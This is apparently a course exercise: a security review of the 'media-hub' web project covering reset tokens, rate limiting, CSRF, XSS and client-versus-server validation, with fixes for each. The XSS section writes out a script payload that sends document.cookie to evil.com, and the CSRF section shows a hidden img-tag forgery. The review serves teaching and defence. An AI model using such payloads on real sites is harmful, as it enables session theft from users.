# EX-3.7 Security Aspects

This document analyses security topics in the context of the **media-hub** project.
Each section describes the threat, shows where it applies in our code, and explains
the correct countermeasure.

---

## 1. Secure Activation & Password-Reset Tokens

### The threat
Activation and password-reset links contain a secret token in the URL.
If the token is predictable, an attacker can guess it and activate accounts they do
not own, or reset someone else's password.

### Current implementation (media-hub)
```java
// AuthController.java
String token = UUID.randomUUID().toString();  // 122 bits of randomness
pending.put(token, dto);
System.out.println("Aktivierung: http://localhost:3000/activate?token=" + token);
```
`UUID.randomUUID()` uses a cryptographically secure random number generator
(`SecureRandom` under the hood), so the token space is large enough to be
unguessable in practice.

### What is still missing
| Gap | Risk | Fix |
|-----|------|-----|
| Tokens never expire | A stolen link works forever | Store a `createdAt` timestamp; reject tokens older than e.g. 24 h |
| Tokens stored in plain memory | Lost on server restart; no audit trail | Persist tokens in the database with a `expires_at` column |
| Token sent in URL | Appears in browser history, server logs, `Referer` headers | Acceptable for activation; for password reset consider a short-lived one-time code sent to the email |
| No used-token check beyond removal | `pending.remove` is atomic but if two requests arrive simultaneously both might succeed in a distributed setup | Use a database row with a `used` flag and a unique constraint |

### Password reset (not yet implemented)
A password reset flow should follow the same pattern:

```
POST /auth/forgot-password  { email }
  → generate SecureRandom token
  → store hash(token) in DB with expiry
  → send link: /reset-password?token=<raw-token>

GET  /reset-password?token=<raw-token>
  → look up hash(token) in DB
  → if found and not expired → show new-password form

POST /auth/reset-password  { token, newPassword }
  → verify hash(token) again
  → update passwordHash, delete token row
```

Storing `hash(token)` in the DB means a database leak does not hand attackers
working reset links.

---

## 2. Rate Limiting & Brute-Force Protection

### The threat
Without limits an attacker can:
- Try millions of passwords against `POST /auth/signIn` (credential stuffing / brute force)
- Hammer `POST /auth/register` to create thousands of fake accounts
- Enumerate activation tokens by rapidly calling `GET /auth/activate`

### Current state in media-hub
There is **no rate limiting** anywhere in the backend. Spring Security is configured
with `csrf disabled` and no `@RateLimiter` annotation. Any client can send unlimited
requests.

### Countermeasures

#### a) IP-based rate limiting (Spring Boot)
Add the **Bucket4j** library and a filter:

```java
// Max 5 login attempts per IP per minute
if (!bucket.tryConsume(1)) {
    response.setStatus(429); // Too Many Requests
    return;
}
```

#### b) Account lockout
After N failed login attempts for the same username, lock the account for a
cooling-off period and require email confirmation to unlock.

```java
// On failed login: increment failedAttempts on Account entity
// If failedAttempts >= 5: set lockedUntil = now + 15 minutes
```

#### c) CAPTCHA
For registration and password reset, add a CAPTCHA (e.g. hCaptcha) to block
automated form submissions.

#### d) Activation token enumeration
`GET /auth/activate?token=<uuid>` returns `400` for an invalid token and `200`
for a valid one. An attacker cannot brute-force a 122-bit UUID in practice, but
adding a rate limit (e.g. 10 requests/minute per IP) removes any doubt.

---

## 3. CSRF (Cross-Site Request Forgery)

### The threat
A malicious website tricks a logged-in user's browser into sending a request to
our backend. Because the browser automatically attaches cookies, the request
arrives with valid authentication.

```
Attacker page:
<img src="http://localhost:8080/upload/victim" hidden>
→ browser sends the request with the victim's session cookie
```

### Current state in media-hub
```java
// SecurityConfig.java
http.csrf(AbstractHttpConfigurer::disable)
```
CSRF protection is **disabled**. This is a deliberate choice during development
but must be revisited before going to production.

### Why it is currently low risk (but still wrong)
- The JWT token is stored in an **HTTP-only cookie** (set by the Next.js Server Action).
  HTTP-only cookies cannot be read by JavaScript, but they *are* still sent by the
  browser on cross-origin requests — so CSRF is still possible.
- The upload and sign-out endpoints accept `POST` requests that a malicious page
  could trigger.

### Correct fix
| Approach | How it works |
|----------|-------------|
| **SameSite=Strict cookie** | Browser will not send the cookie on cross-site requests at all. Set in the `cookieStore.set` call in Next.js. |
| **CSRF token** | Server issues a unique token per session; every mutating request must include it in a header (not a cookie). Spring Security's built-in CSRF support handles this. |
| **Double-submit cookie** | A non-HttpOnly CSRF token is set in a cookie; JavaScript reads it and sends it as a header; the server compares both. |

For media-hub the quickest fix is `SameSite=Strict`:
```typescript
// app/login/actions.ts
cookieStore.set('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',   // ← add this
  path: '/',
  maxAge: 3600,
})
```

And re-enable CSRF in Spring Security for the state-changing endpoints.

---

## 4. XSS (Cross-Site Scripting)

### The threat
An attacker injects malicious JavaScript into data that is later rendered in
another user's browser. The script runs with the privileges of the victim's session
and can steal cookies, tokens, or perform actions on their behalf.

```html
<!-- Example: username stored in DB as: -->
<script>fetch('https://evil.com?t='+document.cookie)</script>

<!-- If rendered without escaping: -->
<p>Welcome, <script>fetch('https://evil.com?t='+document.cookie)</script></p>
```

### Where XSS could occur in media-hub
| Location | Risk |
|----------|------|
| Displaying `username` in `UploadForm.tsx` | React **auto-escapes** JSX expressions — safe |
| Error messages from the backend rendered via `state.error` | Also auto-escaped by React — safe |
| `filename` returned by the server rendered in the success message | Auto-escaped — safe |
| Future: rendering uploaded file content (e.g. SVG, HTML) | **High risk** — an SVG can contain `<script>` tags |

### React's built-in protection
React escapes all values rendered inside JSX `{}` expressions.
This means `<p>{username}</p>` is safe even if `username` contains `<script>`.
The only dangerous escape hatch is `dangerouslySetInnerHTML` — never use it
with user-supplied data.

### What must still be hardened
1. **File upload**: reject MIME types other than `image/*` on the **server** too
   (not only client-side). An attacker can bypass the `accept="image/*"` attribute.
   ```java
   if (!file.getContentType().startsWith("image/")) {
       return ResponseEntity.status(HttpStatus.UNSUPPORTED_MEDIA_TYPE).build();
   }
   ```
2. **Content-Security-Policy header**: add a `Content-Security-Policy` header
   to all responses to instruct the browser not to execute inline scripts.
3. **Stored filenames**: if filenames are displayed anywhere, validate them
   server-side (no `../`, no `.html`, no special characters).

---

## 5. Server-Side vs. Client-Side Validation

### The fundamental rule
> **Client-side validation is UX. Server-side validation is security.**

Client-side validation can always be bypassed — an attacker can disable JavaScript,
use `curl`, or intercept and modify the request with a proxy (e.g. Burp Suite).
Server-side validation must therefore repeat every check the client makes, plus
additional checks the client cannot make (database uniqueness, business rules).

### In media-hub

#### Registration (`POST /auth/register`)

| Check | Client (`page.tsx`) | Server (`AuthController`) |
|-------|--------------------|-----------------------------|
| Fields not empty | ✅ `validate()` in `onSubmit` | ✅ `isBlank()` check → `400` |
| Email format | ✅ regex in `validate()` | ❌ not checked server-side |
| Passwords match | ✅ in `validate()` and `actions.ts` | — (only one password reaches server) |
| Username unique | ❌ (would need an extra API call) | ✅ `existsByUsername()` → `409` |

**Gap**: email format is only validated on the client. A request made with `curl`
can store any string as email:
```bash
curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"x","password":"y","email":"not-an-email"}'
```
Fix: add a `@Email` annotation on the `RegisterDto` and enable `@Valid`:
```java
public record RegisterDto(
    @NotBlank String username,
    @NotBlank String password,
    @Email    String email
) {}

// In controller:
public ResponseEntity<?> register(@Valid @RequestBody RegisterDto dto) { ... }
```
Spring will automatically return `400 Bad Request` if validation fails.

#### File upload (`POST /upload/{username}`)

| Check | Client (`UploadForm.tsx`) | Server (`FileUploadController`) |
|-------|--------------------------|----------------------------------|
| File selected | ✅ `file.size === 0` guard | ✅ `MultipartFile` will be empty |
| Image MIME type | ✅ `file.type.startsWith('image/')` | ❌ not checked server-side |
| File size limit | ❌ | ❌ |
| Username matches logged-in user | — | ✅ `SecurityContextHolder` check |

**Gap**: MIME type and file size are only enforced client-side.

### Summary table

| Validation type | Must be on client | Must be on server |
|----------------|-------------------|-------------------|
| Required fields | ✅ good UX | ✅ mandatory |
| Format (email, regex) | ✅ good UX | ✅ mandatory |
| Uniqueness (username) | optional (extra call) | ✅ mandatory |
| Business rules | optional | ✅ mandatory |
| Auth / ownership | — | ✅ mandatory |
| MIME type / file size | ✅ good UX | ✅ mandatory |

---

## Summary of Open Issues in media-hub

| # | Issue | Severity | Fix |
|---|-------|----------|-----|
| 1 | Activation tokens never expire | Medium | Add `expires_at` column in DB |
| 2 | No rate limiting on `/auth/signIn` | High | Add Bucket4j filter |
| 3 | CSRF protection disabled | High | `sameSite: 'strict'` + re-enable Spring CSRF |
| 4 | No server-side MIME check on upload | Medium | Check `getContentType()` in controller |
| 5 | No server-side email format validation | Low | Add `@Email @Valid` on `RegisterDto` |
| 6 | No file size limit | Medium | Set `spring.servlet.multipart.max-file-size` |
| 7 | JWT secret hardcoded in source | High | Move to `application.properties` / env var |
